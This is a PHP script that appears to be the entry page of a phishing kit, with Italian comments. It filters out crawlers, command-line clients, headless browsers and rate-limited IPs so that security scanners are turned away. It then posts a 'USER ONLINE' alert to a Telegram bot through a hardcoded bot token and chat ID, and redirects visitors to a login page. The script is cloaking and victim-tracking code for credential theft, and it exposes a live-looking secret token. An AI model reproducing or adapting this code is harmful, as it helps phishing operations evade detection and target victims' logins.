<?php
session_start();

// 1. First Layer - Basic Bot Filter
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!isset($_SESSION['verified'])) {
    if (empty($userAgent) || preg_match('/bot|crawl|spider|curl|wget|python|java|php|ruby|httpclient/i', $userAgent)) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    $_SESSION['verified'] = true;
    $_SESSION['fingerprint'] = md5($_SERVER['HTTP_ACCEPT'] . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $userAgent);
}

// 2. Browser Validation Layer
$requiredHeaders = ['HTTP_ACCEPT','HTTP_ACCEPT_LANGUAGE','HTTP_USER_AGENT'];
foreach($requiredHeaders as $h) {
    if(!isset($_SERVER[$h]) || empty($_SERVER[$h])) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
}

// 3. JS validation token check
if (!isset($_SERVER['HTTP_SEC_CH_UA']) || 
    !preg_match('/Chromium|Chrome|Safari|Firefox/i', $_SERVER['HTTP_SEC_CH_UA'])) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}

// 4. Block Headless Browsers
$headlessPattern = '/HeadlessChrome|PhantomJS|QwantBrowser|Puppeteer|Selenium|WebDriver|\\bBot\\b/i';
if (preg_match($headlessPattern, $userAgent)) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}

// 5. Rate Limiting by IP (GET requests only)
$ip = $_SERVER['REMOTE_ADDR'];
$attemptsFile = 'attempts.json';
$rateLimits = ['limit' => 15, 'window' => 300];

$attempts = file_exists($attemptsFile) ? json_decode(file_get_contents($attemptsFile), true) : [];
$currentTime = time();

if (!isset($attempts[$ip]['GET'])) {
    $attempts[$ip]['GET'] = [
        'count' => 1,
        'first' => $currentTime,
        'last' => $currentTime
    ];
} else {
    $attempts[$ip]['GET']['count']++;
    $attempts[$ip]['GET']['last'] = $currentTime;
    if ($currentTime - $attempts[$ip]['GET']['first'] > $rateLimits['window']) {
        unset($attempts[$ip]['GET']);
    }
}

if ($attempts[$ip]['GET']['count'] > $rateLimits['limit']) {
    header("HTTP/1.1 429 Too Many Requests");
    exit;
}
file_put_contents($attemptsFile, json_encode($attempts));

// Token del tuo bot
$botApiToken = '6400179200:AAFLNC22j2zdSxCD83QB70N3zgHyG3AMgiA';
// Il tuo chat ID
$channelId = '8105246558';



// Testo del messaggio
$txt = "🤵USER ONLINE";

// Costruisci la query
$query = http_build_query([
    'chat_id' => $channelId,
    'text' => $txt,
]);

// URL per inviare il messaggio
$url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

// Inizializza cURL
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => 'GET',
]);

// Esegui la richiesta e cattura la risposta
$response = curl_exec($curl);

// Controlla eventuali errori
if ($response === false) {
    // Gestisci l'errore di cURL
    echo 'cURL Error: ' . curl_error($curl);
} else {
    // Puoi anche decodificare la risposta JSON se necessario
    $responseData = json_decode($response, true);
    if ($responseData['ok']) {
        echo "Messaggio inviato con successo!";
    } else {
        echo "Errore nell'invio del messaggio: " . $responseData['description'];
    }
}

// Chiudi la connessione cURL
curl_close($curl);

// Reindirizza all'indirizzo principale (index.php)
header('Location: login/index.html');
exit;
?>
